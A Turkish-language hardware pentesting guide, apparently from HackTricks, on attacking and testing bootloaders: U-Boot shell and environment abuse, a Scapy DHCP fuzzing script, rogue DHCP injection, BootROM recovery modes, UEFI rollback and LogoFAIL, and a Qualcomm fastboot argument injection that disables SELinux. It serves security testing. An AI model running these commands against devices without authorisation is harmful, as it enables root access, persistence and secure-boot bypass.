# Bootloader Testi

{{#include ../../banners/hacktricks-training.md}}

Aşağıdaki adımlar, U-Boot ve UEFI-class loaders gibi bootloader'ların başlangıç yapılandırmalarını değiştirmek ve test etmek için önerilir. Erken kod yürütmesi elde etmeye, imza/rollback korumalarını değerlendirmeye ve recovery veya ağ üzerinden önyükleme yollarını kötüye kullanmaya odaklanın.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Interpreter shell'e erişim
- Boot sırasında, `bootcmd` çalışmadan önce bilinen bir break tuşuna basın (genellikle herhangi bir tuş, 0, space veya karta özel bir "magic" dizisi) ve U-Boot prompt'una düşün.

2. Boot durumunu ve değişkenleri inceleyin
- Faydalı komutlar:
- `printenv` (environment dökümü)
- `bdinfo` (board bilgisi, bellek adresleri)
- `help bootm; help booti; help bootz` (desteklenen kernel boot yöntemleri)
- `help ext4load; help fatload; help tftpboot` (kullanılabilir yükleyiciler)

3. Root shell almak için boot argümanlarını değiştirin
- Kernel'in normal init yerine shell'e düşmesi için `init=/bin/sh` ekleyin:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP sunucunuzdan netboot
- Ağı yapılandırın ve LAN'dan bir kernel/fit imajı çekin:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Değişiklikleri environment üzerinden kalıcı hale getirme
- Eğer env depolama write-protected değilse kontrolü kalıcı hale getirebilirsiniz:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi fallback yolları etkileyen değişkenleri kontrol edin. Yanlış yapılandırılmış değerler tekrarlı şekilde shell'e girme imkânı verebilir.

6. Debug/unsafe özellikleri kontrol edin
- Şuna bakın: `bootdelay` > 0, `autoboot` devre dışı, sınırsız `usb start; fatload usb 0:1 ...`, serial üzerinden `loady`/`loads` yeteneği, `env import`'un untrusted medyadan yapılabilmesi, ve kernel/ramdisk'lerin imza kontrolleri olmadan yüklenmesi.

7. U-Boot image/doğrulama testi
- Platform FIT imajları ile secure/verified boot iddia ediyorsa, hem unsigned hem de tahrif edilmiş imajları deneyin:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` yokluğu veya legacy `verify=n` davranışı sıklıkla keyfi payload'ların boot edilmesine izin verir.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parametre fuzzing
- U-Boot'un legacy BOOTP/DHCP işleme kodunda bellek-güvenliği sorunları oldu. Örneğin, CVE‑2024‑42040, crafted DHCP cevapları yoluyla U-Boot belleğinden byte'ların wire üzerinde leak edilmesine neden olan bir bellek açığını tanımlar. DHCP/PXE kod yollarını aşırı uzun/edge-case değerlerle (option 67 bootfile-name, vendor options, file/servername alanları) zorlayın ve takılma/leak davranışlarını gözleyin.
- Netboot sırasında boot parametrelerini stres etmek için minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Ayrıca PXE filename alanlarının OS tarafı provisioning script'lerine zincirlendiğinde shell/loader mantığına sanitizasyon olmadan geçirilip geçirilmediğini doğrulayın.

9. Rogue DHCP server komut enjeksiyonu testi
- Rogue bir DHCP/PXE servisi kurun ve filename veya options alanlarına karakterler enjekte ederek boot zincirinin sonraki aşamalarında komut yorumlayıcılarına ulaşmaya çalışın. Metasploit’in DHCP auxiliary modülü, `dnsmasq` veya custom Scapy script'leri iyi çalışır. Önce lab ağını izole ettiğinizden emin olun.

## SoC ROM recovery modları normal boot'u geçersiz kılar

Birçok SoC, flash imajları geçersiz olsa bile USB/UART üzerinden kod kabul eden BootROM "loader" modunu açığa çıkarır. Eğer secure-boot fuse/OTP'leri yakılmadıysa, bu zincirde çok erken aşamada keyfi kod yürütmesi sağlayabilir.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Örnek: `imx-usb-loader u-boot.imx` ile custom bir U-Boot'u RAM'den çalıştırın.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Örnek: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Örnek: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ile bir loader sahneleyip custom U-Boot yükleyin.

Cihazın secure-boot eFuse/OTP'lerinin yakılıp yakılmadığını değerlendirin. Eğer yakılmamışsa, BootROM download modları sıklıkla U-Boot, kernel, rootfs gibi üst seviye doğrulamaları atlayarak ilk aşama payload'unuzu doğrudan SRAM/DRAM'de çalıştırır.

## UEFI/PC-class bootloaders: quick checks

10. ESP tahrifi ve rollback testi
- EFI System Partition (ESP)'i mount edin ve loader bileşenlerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo yolları.
- Eğer Secure Boot revocations (dbx) güncel değilse, downgrade edilmiş veya bilinen-vulnerable imzalı boot bileşenleri ile boot etmeyi deneyin. Platform eski shim/bootmanager'ları hala trust ediyorsa, ESP'den kendi kernel'inizi veya `grub.cfg`'nizi yükleyerek persistence elde edebilirsiniz.

11. Boot logo parsing hataları (LogoFAIL class)
- Birçok OEM/IBV firmware'i, boot logolarını işleyen DXE parçalarında image-parsing hatalarına karşı savunmasızdı. Eğer bir saldırgan ESP üzerine vendor-specific bir path'e (ör. `\EFI\<vendor>\logo\*.bmp`) crafted bir imaj yerleştirebiliyorsa ve reboot yapabiliyorsa, Secure Boot açık olsa bile erken boot sırasında kod yürütmesi mümkün olabilir. Platformun kullanıcı tarafından sağlanan logoları kabul edip etmediğini ve bu yolların OS'den yazılabilir olup olmadığını test edin.

## Android/Qualcomm ABL + GBL (Android 16) güven boşlukları

Qualcomm'un ABL'sini kullanarak `efisp` partition'ından Generic Bootloader Library (GBL) yükleyen Android 16 cihazlarda, ABL'nin `efisp`'den yüklediği UEFI app'i authenticate edip etmediğini doğrulayın. Eğer ABL sadece UEFI app'in varlığını kontrol ediyor ve imzaları doğrulamıyorsa, `efisp`'e yazma primitive'i pre-OS unsigned kod yürütmesi (boot sırasında) sağlar.

Pratik kontroller ve kötüye kullanım yolları:

- efisp write primitive: `efisp`'e custom bir UEFI app yazmak için bir yol gerekir (root/privileged servis, OEM app bug, recovery/fastboot yolu). Bunu yapmadan GBL yükleme boşluğu doğrudan erişilebilir olmaz.
- fastboot OEM argument injection (ABL bug): Bazı build'ler `fastboot oem set-gpu-preemption` komutunda ekstra token'ları kabul edip bunları kernel cmdline'a ekliyor. Bu, SELinux'u permissive yapmak gibi korumalı partition yazma izinlerini zorlamak için kullanılabilir:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Eğer cihaz patched ise, komut ekstra argümanları reddetmelidir.
- Bootloader unlock via persistent flags: Boot-stage bir payload kalıcı unlock flag'lerini (ör. `is_unlocked=1`, `is_unlocked_critical=1`) flip ederek `fastboot oem unlock`'u OEM sunucu/onay kapıları olmadan taklit edebilir. Bu bir sonraki reboot sonrası kalıcı bir durum değişikliği olur.

Defansif/triage notları:

- ABL'nin `efisp`'ten gelen GBL/UEFI payload üzerinde signature doğrulaması yapıp yapmadığını teyit edin. Yapmıyorsa `efisp` yüksek riskli bir persistence yüzeyi olarak değerlendirilmelidir.
- ABL fastboot OEM handler'larının argüman sayılarını validate edip ekstra token'ları reddedecek şekilde patchlenip patchlenmediğini takip edin.

## Donanım uyarısı

Erken boot sırasında (ör. okuma atlamak için pinleri topraklamak) SPI/NAND flash ile etkileşimde bulunurken dikkatli olun ve her zaman flash datasheet'ini kontrol edin. Zamanlanmamış kısa devreler cihazı veya programmer'ı bozabilir.

## Notlar ve ek ipuçları

- `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` ile environment blob'larını RAM ve depolama arasında taşımayı deneyin; bazı platformlar auth olmadan çıkarılabilir medyadan env import edilmesine izin verir.
- extlinux.conf ile boot eden Linux tabanlı sistemlerde persistence için boot partition üzerindeki `APPEND` satırını değiştirmek (ör. `init=/bin/sh` veya `rd.break` eklemek) genellikle imza kontrolleri yoksa yeterlidir.
- Kullanıcı alanı `fw_printenv/fw_setenv` sağlıyorsa, `/etc/fw_env.config`'in gerçek env depolama ile eşleştiğini doğrulayın. Yanlış yapılandırılmış offset'ler yanlış MTD bölgesini okuma/yazma imkânı verebilir.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
